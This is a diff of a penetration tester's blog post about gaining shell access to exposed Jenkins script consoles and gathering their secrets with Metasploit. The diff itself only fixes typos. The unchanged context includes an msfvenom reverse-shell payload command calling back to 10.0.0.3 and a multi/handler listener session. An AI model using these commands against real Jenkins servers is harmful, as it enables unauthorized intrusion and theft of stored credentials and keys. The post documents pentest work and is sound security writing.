@@ -5,7 +5,7 @@ author: "Joshua Rogers"
 categories: security
 ---
 
-During my pentesting, I've found it quite common to find Jenkins instances which either have open registration, or an easy-to-guess login combination.
+During my pen-testing, I've found it quite common to find Jenkins instances which either have open registration, or an easy-to-guess login combination.
 Jenkins has functionality that allows users to execute Groovy script via its [/script/ endpoint](https://www.jenkins.io/doc/book/managing/script-console/).
 If this is not secured, an attacker can execute system commands on the Jenkins server, decrypt passwords, and steal keys.
 
@@ -19,12 +19,11 @@ Instead of using the typical `jenkins_script_console` script, instead I prepared
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.3 LPORT=4444 -f elf -o /tmp/payload.bin
 ```
 
-I then uploaded payload.bin to my webserver, to be downloaded later on on the Jenkins server.
+I then uploaded payload.bin to my web-server, to be downloaded later on on the Jenkins server.
 
 Back on my host, I run `msfconsole`, and use the following:
 
 ```
-
 msf6 > use exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
 msf6 exploit(multi/handler) > set PAYLOAD linux/x86/shell_reverse_tcp
@@ -61,8 +60,9 @@ msf6 post(multi/gather/jenkins_gather) > run
 
 Aaaand it failed. What?
 As it turns out, the server Jenkins was running on had a nearly full disk, and the hardware was over a decade old. The kernel was from 2014!
+
 In order for the Metasploit module to determine where secrets are kept, `find / -name 'secret.key.not-so-secret'` is run, with a 120-second timeout.
-On this server, the `find` command was taking over two minutes, and even though I knew where the secrets were stored, I couldn't force the module to use it. Ther other pitfall was that even if `find` did find the correct folder, it did not halt searching the drive after the first result; it would just time-out, due to the nearly-full drive.
+On this server, the `find` command was taking over two minutes, and even though I knew where the secrets were stored, I couldn't force the module to use it. The other pitfall was that even if `find` did find the correct folder, it did not halt searching the drive after the first result; it would just time-out, due to the nearly-full drive.
 
 I made a patch to add an optional variable that instructs the module to use a specific directory for the secrets, [metasploit-framework/pull/17681](https://github.com/rapid7/metasploit-framework/pull/17681).
 
